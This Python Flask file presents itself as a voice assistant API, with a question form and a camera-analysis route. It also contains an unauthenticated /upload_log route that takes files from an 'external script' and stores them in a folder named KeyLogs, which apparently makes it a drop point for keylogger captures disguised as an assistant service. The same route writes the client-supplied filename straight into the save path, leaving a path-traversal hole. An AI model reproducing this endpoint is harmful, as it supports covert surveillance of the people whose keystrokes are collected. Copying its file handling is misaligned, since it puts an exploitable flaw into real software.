import os
from flask import Flask, request, jsonify, render_template_string
from assistant import handle_user_input, analyze_camera_image
from datetime import datetime

app = Flask(__name__)

# Home route with a basic HTML form for asking questions
@app.route('/')
def home():
    return render_template_string("""
        <h2>Voice Assistant API</h2>
        <form action="/ask" method="post" id="askForm">
            <input type="text" name="message" placeholder="Ask something..." />
            <button type="submit">Ask</button>
        </form>
        <p id="response"></p>

        <script>
        const form = document.getElementById('askForm');
        form.addEventListener('submit', async (e) => {
            e.preventDefault();
            const input = form.message.value;
            const res = await fetch('/ask', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({message: input})
            });
            const data = await res.json();
            document.getElementById('response').innerText = data.response;
        });
        </script>
    """)

# Ask route for handling the user input for voice assistant
@app.route('/ask', methods=['POST'])
def ask():
    data = request.get_json() or request.form
    message = data.get('message', '')
    result = handle_user_input(message)
    return jsonify({'response': result})

# Analyze route for analyzing images (assuming it’s part of your assistant)
@app.route('/analyze', methods=['GET'])
def analyze():
    result = analyze_camera_image()
    return jsonify({'description': result})

# Route for receiving logs from external script
@app.route('/upload_log', methods=['POST'])
def upload_log():
    if 'file' not in request.files:
        return jsonify({'error': 'No file part'}), 400
    
    file = request.files['file']
    if file.filename == '':
        return jsonify({'error': 'No selected file'}), 400

    # Log directory (consider changing for deployment on other platforms like Render)
    log_dir = os.path.expanduser("~\\KeyLogs")  # Update for deployment or use /tmp
    os.makedirs(log_dir, exist_ok=True)
    
    # Save the received file with the current timestamp
    log_file_path = os.path.join(log_dir, f"{datetime.now().strftime('%Y%m%d_%H%M%S')}_{file.filename}")
    file.save(log_file_path)
    
    # Optionally, log the file save operation
    print(f"Log file saved at: {log_file_path}")
    
    return jsonify({'message': 'File uploaded successfully', 'log_file': log_file_path}), 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
